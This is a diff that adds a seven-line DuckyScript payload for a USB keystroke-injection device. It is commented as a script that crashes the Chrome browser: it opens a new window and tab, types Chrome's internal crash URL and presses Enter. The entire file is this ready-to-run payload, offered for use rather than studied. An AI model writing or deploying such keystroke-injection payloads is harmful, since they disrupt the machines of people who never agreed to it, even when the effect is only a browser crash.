@@ -1,0 +1,7 @@
+REM A script that crashes chrome browser
+CTRL N
+DELAY 50
+CTRL T
+DELAY 100
+STRING chrome://inducebrowsercrashforrealz/
+ENTER
